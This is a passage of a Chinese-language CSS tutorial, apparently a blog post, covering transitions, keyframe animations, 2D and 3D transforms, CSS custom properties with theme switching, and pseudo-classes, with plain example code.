&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="高级组合技巧"><a href="#高级组合技巧" class="headerlink" title="高级组合技巧"></a>高级组合技巧</h3><p><strong>渐变 + 滤镜实现 3D 按钮</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.btn-3d</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<br>    <span class="hljs-number">145deg</span>,<br>    <span class="hljs-number">#ffffff</span> <span class="hljs-number">0%</span>,<br>    <span class="hljs-number">#c8c8c8</span> <span class="hljs-number">50%</span>,<br>    <span class="hljs-number">#ffffff</span> <span class="hljs-number">100%</span><br>  );<br>  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">drop-shadow</span>(<span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.2</span>));<br>  &amp;<span class="hljs-selector-pseudo">:active</span> &#123;<br>    <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">brightness</span>(<span class="hljs-number">0.95</span>) <span class="hljs-built_in">drop-shadow</span>(<span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-过渡与动画（transition、-keyframes、animation）"><a href="#3-3-过渡与动画（transition、-keyframes、animation）" class="headerlink" title="3.3 过渡与动画（transition、@keyframes、animation）"></a>3.3 过渡与动画（transition、@keyframes、animation）</h2><h3 id="CSS过渡（transition）"><a href="#CSS过渡（transition）" class="headerlink" title="CSS过渡（transition）"></a>CSS过渡（transition）</h3><p>实现属性变化的平滑过渡（适合简单的交互效果）</p><p><strong>核心属性</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.element</span> &#123;<br>  <span class="hljs-attribute">transition</span>: <br>    [property] [duration] [timing-function] [delay];<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>参数详解：<ul><li>property：要过渡的属性（如 all、opacity）</li><li>duration：持续时间（0.3s 或 300ms）</li><li>timing-function：速度曲线（ease-in-out）</li><li>delay：延迟时间（可选）</li></ul></li></ul><p><strong>贝塞尔曲线进阶</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 自定义缓动曲线（阿里Ant Motion规范） */</span><br><span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.4s</span> <span class="hljs-built_in">cubic-bezier</span>(<span class="hljs-number">0.68</span>, -<span class="hljs-number">0.6</span>, <span class="hljs-number">0.32</span>, <span class="hljs-number">1.6</span>);<br></code></pre></td></tr></table></figure><ul><li>常用预设：<ul><li>ease-in-out：平滑加减速</li><li>linear：均速</li><li>steps(4)：分步动画</li></ul></li></ul><p><strong>实践</strong></p><p>（1）硬件加速</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span>;<br>  <span class="hljs-attribute">will-change</span>: transform; <span class="hljs-comment">/* 预提示浏览器 */</span><br>&#125;<br><span class="hljs-selector-class">.card</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">5px</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="关键帧动画（-keyframes）"><a href="#关键帧动画（-keyframes）" class="headerlink" title="关键帧动画（@keyframes）"></a>关键帧动画（@keyframes）</h3><p>定义复杂的多阶段动画，适合需要精确控制的场景。</p><p><strong>基本语法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@keyframes</span> slideIn &#123;<br>  <span class="hljs-selector-tag">from</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">100%</span>); &#125;<br>  <span class="hljs-selector-tag">to</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0</span>); &#125;<br>&#125;<br><br><span class="hljs-comment">/* 或百分比控制 */</span><br><span class="hljs-keyword">@keyframes</span> pulse &#123;<br>  <span class="hljs-number">0%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; &#125;<br>  <span class="hljs-number">50%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>; &#125;<br>  <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>动画属性（animation）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.element</span> &#123;<br>  <span class="hljs-attribute">animation</span>: <br>    [name] [duration] [timing-function] [delay] <br>    [iteration-count] [direction] [fill-mode];<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>参数扩展：<ul><li>iteration-count：播放次数（infinite表示无限循环）</li><li>direction：alternate（往返播放）</li><li>fill-mode：forwards（保留最后一帧）</li></ul></li></ul><p><strong>视频加载动画案例</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@keyframes</span> dotPulse &#123;<br>  <span class="hljs-number">0%</span>, <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1</span>); <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; &#125;<br>  <span class="hljs-number">50%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.5</span>); <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.7</span>; &#125;<br>&#125;<br><span class="hljs-selector-class">.loading-dot</span> &#123;<br>  <span class="hljs-attribute">animation</span>: dotPulse <span class="hljs-number">1.5s</span> infinite ease-in-out;<br>&#125;<br><span class="hljs-selector-class">.loading-dot</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">2</span>) &#123;<br>  <span class="hljs-attribute">animation-delay</span>: <span class="hljs-number">0.2s</span>;<br>&#125;<br><span class="hljs-selector-class">.loading-dot</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">3</span>) &#123;<br>  <span class="hljs-attribute">animation-delay</span>: <span class="hljs-number">0.4s</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>可动画属性性能排行</strong></p><table><thead><tr><th align="left">属性类型</th><th align="left">性能影响</th><th align="left">推荐场景</th></tr></thead><tbody><tr><td align="left">transform</td><td align="left">最优</td><td align="left">位移&#x2F;旋转&#x2F;缩放</td></tr><tr><td align="left">opacity</td><td align="left">优</td><td align="left">淡入淡出</td></tr><tr><td align="left">color</td><td align="left">中</td><td align="left">非高频变化</td></tr><tr><td align="left">width&#x2F;height</td><td align="left">差</td><td align="left">避免在动画中使用</td></tr></tbody></table><h2 id="3-4-变形（transform：rotate、scale、translate）"><a href="#3-4-变形（transform：rotate、scale、translate）" class="headerlink" title="3.4 变形（transform：rotate、scale、translate）"></a>3.4 变形（transform：rotate、scale、translate）</h2><h3 id="transform-核心功能总览"><a href="#transform-核心功能总览" class="headerlink" title="transform 核心功能总览"></a>transform 核心功能总览</h3><p>在不影响文档流的前提下，对元素进行视觉变形，包含四大类操作：</p><table><thead><tr><th align="left">变形类型</th><th align="left">函数示例</th><th align="left">变形基准点（默认）</th></tr></thead><tbody><tr><td align="left">旋转（Rotate）</td><td align="left">rotate(45deg)</td><td align="left">元素中心</td></tr><tr><td align="left">缩放（Scale）</td><td align="left">scale(1.2)</td><td align="left">元素中心</td></tr><tr><td align="left">位移（Translate）</td><td align="left">translate(20px, 50px)</td><td align="left">元素自身位置</td></tr><tr><td align="left">倾斜（Skew）</td><td align="left">skew(15deg)</td><td align="left">元素中心</td></tr></tbody></table><h3 id="二维变形详解"><a href="#二维变形详解" class="headerlink" title="二维变形详解"></a>二维变形详解</h3><p>（1）旋转 - rotate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-rotate</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">30deg</span>); <span class="hljs-comment">/* 顺时针旋转 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>进阶控制：</p><ul><li>rotateX(45deg)：绕X轴旋转（3D效果）</li><li>rotateY(180deg)：绕Y轴旋转（镜面翻转）</li><li>rotateZ(90deg)：等同于rotate()（Z轴垂直于屏幕）</li></ul><p>（2）缩放 - scale</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-scale</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.5</span>); <span class="hljs-comment">/* 整体放大1.5倍 */</span><br>  <span class="hljs-comment">/* 或分开控制 */</span><br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scaleX</span>(<span class="hljs-number">1.2</span>) <span class="hljs-built_in">scaleY</span>(<span class="hljs-number">0.8</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>陷阱：</p><ul><li>缩放不影响布局（相邻元素不会自动避让）</li><li>可能引发文字模糊（需配合transform-origin调整基准点）</li></ul><p>（3）位移 - translate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-translate</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(<span class="hljs-number">50%</span>, -<span class="hljs-number">20px</span>); <span class="hljs-comment">/* 水平50% 垂直-20px */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>百分比计算基准：</p><ul><li>translateX(50%)：基于元素自身宽度</li><li>left: 50%：基于父容器宽度</li></ul><p>（4）倾斜 - skew</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-skew</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">skew</span>(<span class="hljs-number">15deg</span>, -<span class="hljs-number">10deg</span>); <span class="hljs-comment">/* X轴15° Y轴-10° */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>应用场景：创建平行四边形按钮、斜切 banner 效果</p><h3 id="变形属性性能排序"><a href="#变形属性性能排序" class="headerlink" title="变形属性性能排序"></a>变形属性性能排序</h3><table><thead><tr><th align="left">变形类型</th><th align="left">性能影响</th><th align="left">推荐场景</th></tr></thead><tbody><tr><td align="left">translate</td><td align="left">最优</td><td align="left">位移动画</td></tr><tr><td align="left">scale</td><td align="left">优</td><td align="left">缩放效果</td></tr><tr><td align="left">rotate</td><td align="left">中</td><td align="left">避免高频旋转</td></tr><tr><td align="left">filter+变形</td><td align="left">差</td><td align="left">谨慎组合使用</td></tr></tbody></table><h2 id="3-5-3D-变换（perspective、transform-style）"><a href="#3-5-3D-变换（perspective、transform-style）" class="headerlink" title="3.5 3D 变换（perspective、transform-style）"></a>3.5 3D 变换（perspective、transform-style）</h2><h3 id="3D-变换核心概念"><a href="#3D-变换核心概念" class="headerlink" title="3D 变换核心概念"></a>3D 变换核心概念</h3><p>CSS 3D 变换通过模拟三维坐标系（X&#x2F;Y&#x2F;Z 轴）实现立体效果，关键依赖两个属性：</p><table><thead><tr><th align="left">属性</th><th align="left">作用</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left">perspective</td><td align="left">定义观察者与3D空间的视觉距离</td><td align="left">none</td></tr><tr><td align="left">transform-style</td><td align="left">决定子元素是否保留3D变换特性</td><td align="left">flat</td></tr></tbody></table><h3 id="perspective-景深控制"><a href="#perspective-景深控制" class="headerlink" title="perspective 景深控制"></a>perspective 景深控制</h3><p>原理：模拟人眼到3D物体的距离，数值越小透视效果越强。</p><p><strong>基础用法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">perspective</span>: <span class="hljs-number">1000px</span>; <span class="hljs-comment">/* 推荐值：500-2000px */</span><br>&#125;<br><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">45deg</span>); <span class="hljs-comment">/* 此时会有3D透视效果 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>两种设置方式</strong></p><p>（1）场景景深（父元素设置，影响所有子元素）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.scene</span> &#123;<br>  <span class="hljs-attribute">perspective</span>: <span class="hljs-number">1200px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）个体景深（元素自身设置，仅影响当前元素）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">perspective</span>(<span class="hljs-number">1200px</span>) <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">45deg</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>性能优化</strong></p><ul><li>避免动态修改perspective（触发重排）</li><li>移动端建议值≥800px（防止过度变形）</li></ul><h3 id="transform-style-3D-空间继承"><a href="#transform-style-3D-空间继承" class="headerlink" title="transform-style 3D 空间继承"></a>transform-style 3D 空间继承</h3><p>控制子元素是否在独立 3D 空间中渲染：</p><table><thead><tr><th align="left">值</th><th align="left">效果</th><th align="left">应用场景</th></tr></thead><tbody><tr><td align="left">flat</td><td align="left">子元素被压扁到2D平面（默认）</td><td align="left">普通变形</td></tr><tr><td align="left">preserve-3d</td><td align="left">子元素保持3D空间关系</td><td align="left">复杂3D组合体</td></tr></tbody></table><p><strong>典型案例：立方体制作</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;cube&quot;&gt;<br>  &lt;div class=&quot;face front&quot;&gt;Front&lt;/div&gt;<br>  &lt;div class=&quot;face back&quot;&gt;Back&lt;/div&gt;<br>  &lt;!-- 其他4个面 --&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.cube</span> &#123;<br>  <span class="hljs-attribute">transform-style</span>: preserve-<span class="hljs-number">3</span>d;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">15deg</span>) <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">30deg</span>);<br>&#125;<br><span class="hljs-selector-class">.face</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;<br>&#125;<br><span class="hljs-selector-class">.front</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">100px</span>); &#125;<br><span class="hljs-selector-class">.back</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">180deg</span>) <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">100px</span>); &#125;<br><span class="hljs-comment">/* 其他面类似 */</span><br></code></pre></td></tr></table></figure><h3 id="3D-变换函数进阶"><a href="#3D-变换函数进阶" class="headerlink" title="3D 变换函数进阶"></a>3D 变换函数进阶</h3><p><strong>三维位移</strong></p><table><thead><tr><th align="left">函数</th><th align="left">轴方向</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">translateZ(z)</td><td align="left">垂直于屏幕（远近）</td><td align="left">translateZ(50px)</td></tr><tr><td align="left">translate3d(x,y,z)</td><td align="left">三维复合位移</td><td align="left">translate3d(0, 10%, 20px)</td></tr></tbody></table><p><strong>三维旋转</strong></p><table><thead><tr><th align="left">函数</th><th align="left">旋转轴</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">rotateX(angle)</td><td align="left">水平轴（上下翻转）</td><td align="left">rotateX(45deg)</td></tr><tr><td align="left">rotateY(angle)</td><td align="left">垂直轴（左右翻转）</td><td align="left">rotateY(180deg)</td></tr><tr><td align="left">rotate3d(x,y,z,a)</td><td align="left">自定义旋转轴</td><td align="left">rotate3d(1,1,0,45deg)</td></tr></tbody></table><h3 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h3><p>（1）复合动画策略</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 错误示范：连续修改不同属性 */</span><br><span class="hljs-keyword">@keyframes</span> bad-animation &#123;<br>  <span class="hljs-number">0%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">0</span>); &#125;<br>  <span class="hljs-number">50%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">100px</span>); &#125;<br>  <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">180deg</span>); &#125;<br>&#125;<br><br><span class="hljs-comment">/* 正确做法：保持相同变换属性 */</span><br><span class="hljs-keyword">@keyframes</span> good-animation &#123;<br>  <span class="hljs-number">0%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">0</span>) <span class="hljs-built_in">translateY</span>(<span class="hljs-number">0</span>); &#125;<br>  <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">180deg</span>) <span class="hljs-built_in">translateY</span>(<span class="hljs-number">100px</span>); &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="第四章：CSS-高级特性"><a href="#第四章：CSS-高级特性" class="headerlink" title="第四章：CSS 高级特性"></a>第四章：CSS 高级特性</h1><h2 id="4-1-变量（CSS-Custom-Properties）"><a href="#4-1-变量（CSS-Custom-Properties）" class="headerlink" title="4.1 变量（CSS Custom Properties）"></a>4.1 变量（CSS Custom Properties）</h2><h3 id="基础概念与语法"><a href="#基础概念与语法" class="headerlink" title="基础概念与语法"></a>基础概念与语法</h3><p>CSS 变量（又成自定义属性）是 CSS 的动态存储机制，具有级联继承特性</p><p><strong>定义与使用</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 定义变量（带--前缀） */</span><br><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span class="hljs-attr">--primary-color</span>: <span class="hljs-number">#4285f4</span>;<br>  <span class="hljs-attr">--spacing-unit</span>: <span class="hljs-number">8px</span>;<br>&#125;<br><br><span class="hljs-comment">/* 使用变量（通过var()函数） */</span><br><span class="hljs-selector-class">.button</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--primary-color);<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-built_in">var</span>(--spacing-unit) <span class="hljs-built_in">calc</span>(<span class="hljs-built_in">var</span>(--spacing-unit) * <span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>作用域规则</strong></p><ul><li>全局变量：定义在 <code>:root</code> 选择器内</li><li>局部变量：定义在特定选择器内</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attr">--card-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>); <span class="hljs-comment">/* 仅.card内有效 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="核心特性解析"><a href="#核心特性解析" class="headerlink" title="核心特性解析"></a>核心特性解析</h3><p><strong>动态计算能力</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span class="hljs-attr">--base-size</span>: <span class="hljs-number">16px</span>;<br>  <span class="hljs-attr">--h1-size</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-built_in">var</span>(--base-size) * <span class="hljs-number">2</span>);<br>&#125;<br><span class="hljs-selector-tag">h1</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-built_in">var</span>(--h1-size); &#125;<br></code></pre></td></tr></table></figure><p><strong>回退机制</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.element</span> &#123;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--undefined-var, <span class="hljs-number">#f00</span>); <span class="hljs-comment">/* 变量不存在时使用#f00 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>类型灵活性</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span class="hljs-attr">--theme-gradient</span>: <span class="hljs-built_in">linear-gradient</span>(to right, <span class="hljs-number">#ff8a00</span>, <span class="hljs-number">#da1b60</span>);<br>  <span class="hljs-attr">--mobile-breakpoint</span>: <span class="hljs-number">768px</span>;<br>  <span class="hljs-attr">--transition-config</span>: <span class="hljs-number">0.3s</span> ease-in-out;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="应用场景示例：主题切换"><a href="#应用场景示例：主题切换" class="headerlink" title="应用场景示例：主题切换"></a>应用场景示例：主题切换</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 定义主题变量 */</span><br><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span class="hljs-attr">--bg-color</span>: <span class="hljs-number">#fff</span>;<br>  <span class="hljs-attr">--text-color</span>: <span class="hljs-number">#333</span>;<br>&#125;<br><br><span class="hljs-comment">/* 暗色模式 */</span><br><span class="hljs-selector-attr">[data-theme=<span class="hljs-string">&quot;dark&quot;</span>]</span> &#123;<br>  <span class="hljs-attr">--bg-color</span>: <span class="hljs-number">#222</span>;<br>  <span class="hljs-attr">--text-color</span>: <span class="hljs-number">#f0f0f0</span>;<br>&#125;<br><br><span class="hljs-selector-tag">body</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--bg-color);<br>  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color);<br>  <span class="hljs-attribute">transition</span>: background <span class="hljs-number">0.3s</span>, color <span class="hljs-number">0.3s</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// JS切换主题</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;data-theme&#x27;</span>, <span class="hljs-string">&#x27;dark&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="4-2-伪类与伪元素（-hover、-before、-selection）"><a href="#4-2-伪类与伪元素（-hover、-before、-selection）" class="headerlink" title="4.2 伪类与伪元素（:hover、::before、::selection）"></a>4.2 伪类与伪元素（:hover、::before、::selection）</h2><h3 id="核心概念区分"><a href="#核心概念区分" class="headerlink" title="核心概念区分"></a>核心概念区分</h3><table><thead><tr><th align="left">特性</th><th align="left">伪类（Pseudo-class）</th><th align="left">伪元素（Pseudo-element）</th></tr></thead><tbody><tr><td align="left">语法</td><td align="left">单冒号（:hover）</td><td align="left">双冒号（::before）</td></tr><tr><td align="left">作用对象</td><td align="left">选择元素的特定状态</td><td align="left">创建元素的虚拟子元素</td></tr><tr><td align="left">DOM表现</td><td align="left">不创建新节点</td><td align="left">创建文档树外的抽象元素</td></tr><tr><td align="left">典型应用</td><td align="left">交互状态（如:hover）</td><td align="left">装饰性内容（如::before）</td></tr></tbody></table><h3 id="伪类详解（状态选择器）"><a href="#伪类详解（状态选择器）" class="headerlink" title="伪类详解（状态选择器）"></a>伪类详解（状态选择器）</h3><p><strong>动态交互伪类</strong></p><table><thead><tr><th align="left">伪类</th><th align="left">触发条件</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">:hover</td><td align="left">鼠标悬停</td><td align="left">a:hover { color: red }</td></tr><tr><td align="left">:active</td><td align="left">元素被激活（如点击按下）</td><td align="left">button:active { transform: scale(0.98) }</td></tr><tr><td align="left">:focus</td><td align="left">获得焦点（表单&#x2F;可聚焦元素）</td><td align="left">input:focus { border-color: blue }</td></tr><tr><td align="left">:focus-visible</td><td align="left">键盘聚焦时生效</td><td align="left">兼容outline无障碍设计</td></tr></tbody></table><p><strong>结构伪类</strong></p><table><thead><tr><th align="left">伪类</th><th align="left">匹配规则</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">:first-child</td><td align="left">父元素的首个子元素</td><td align="left">li:first-child { font-weight: bold }</td></tr><tr><td align="left">:nth-child(n)</td><td align="left">第n个子元素（支持公式）</td><td align="left">tr:nth-child(2n+1) { background: #f5f5f5 }</td></tr><tr><td align="left">:not(selector)</td><td 